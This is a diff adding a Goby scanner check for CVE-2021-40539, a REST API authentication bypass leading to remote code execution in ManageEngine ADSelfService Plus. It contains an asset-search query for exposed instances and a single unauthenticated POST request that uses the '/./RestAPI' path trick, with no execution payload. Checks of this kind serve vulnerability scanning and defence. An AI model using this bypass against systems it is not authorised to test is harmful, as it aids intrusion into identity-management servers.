@@ -1,0 +1,72 @@
+{
+      "Name": "ADSelfService Plus RCE CVE-2021-40539",
+      "Level": "3",
+      "Tags": [
+            "rce",
+            "unauth"
+      ],
+      "GobyQuery": "(title=\"ManageEngine - ADSelfService Plus\" | app=\"ZOHO-ManageEngine-ADSelfService\" | title==\"ADSelfService Plus\" | body=\"ADSelfService Plus\")",
+      "Description": "Zoho ManageEngine ADSelfService Plus 6113版本及更早版本存在授权问题漏洞，该漏洞源于软件很容易绕过REST API认证，从而导致远程代码执行",
+      "Product": "ADSelfService Plus",
+      "Homepage": "https://www.manageengine.cn/products/self-service-password/pricing-details.html",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://forum.butian.net/share/876"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/./RestAPI/LogonCustomization",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "methodToCall=previewMobLogo",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "var d = new Date();",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "window.parent.$(\"#tabLogo\")",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-30 20:01:22",
+      "GobyVersion": "1.9.310"
+}
